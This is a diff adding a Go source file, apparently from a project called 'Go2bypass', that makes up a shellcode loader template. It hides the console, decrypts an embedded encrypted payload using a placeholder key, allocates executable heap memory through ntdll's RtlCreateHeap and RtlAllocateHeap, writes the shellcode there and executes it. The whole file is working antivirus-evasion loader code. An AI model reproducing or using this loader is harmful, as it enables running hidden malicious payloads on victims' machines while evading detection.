@@ -1,0 +1,49 @@
+//good
+package main
+
+import (
+	Go2public "Go2bypass/Public"
+	"os"
+	_ "embed"
+	"syscall"
+	"unsafe"
+)
+
+//go:embed CodeToStringShell.txt
+var CodeToStringShell string
+
+var ApiDe Go2public.ApiEDcrypt
+var CodeEnContent Go2public.CodToshellKey
+
+func main() {
+	/******HideConsole******/
+	Go2public.Peels()
+	CodeEnContent.KeyKey = `/******KeyKey******/`
+	CodeEnContent.CodeToStringShell = CodeToStringShell
+	/******DecodeType******/
+	sc, err := ApiDe.CodeToShellDncrypt(CodeEnContent)
+	if err != nil {
+		os.Exit(0)
+	}
+	baseA, _ := allocfunc(uintptr(len(sc)))
+	WriteMemory(sc, baseA)
+	syscall.Syscall(baseA, 0, 0, 0, 0)
+}
+func allocfunc(shellSize uintptr) (uintptr, error) {
+	ntdll := syscall.NewLazyDLL("ntdll.dll")
+	RtlCreateHeap := ntdll.NewProc("RtlCreateHeap")
+	RtlAllocateHeap := ntdll.NewProc("RtlAllocateHeap")
+	hhandl, _, _ := RtlCreateHeap.Call(0x00040000|0x00000002, 0, shellSize, shellSize, 0, 0)
+	alloc, _, _ := RtlAllocateHeap.Call(hhandl, 0x00000008, shellSize)
+	if alloc == 0 {
+		return 0, nil
+	}
+	return alloc, nil
+}
+func WriteMemory(inbuf []byte, destination uintptr) {
+	for index := uint32(0); index < uint32(len(inbuf)); index++ {
+		writePtr := unsafe.Pointer(destination + uintptr(index))
+		v := (*byte)(writePtr)
+		*v = inbuf[index]
+	}
+}
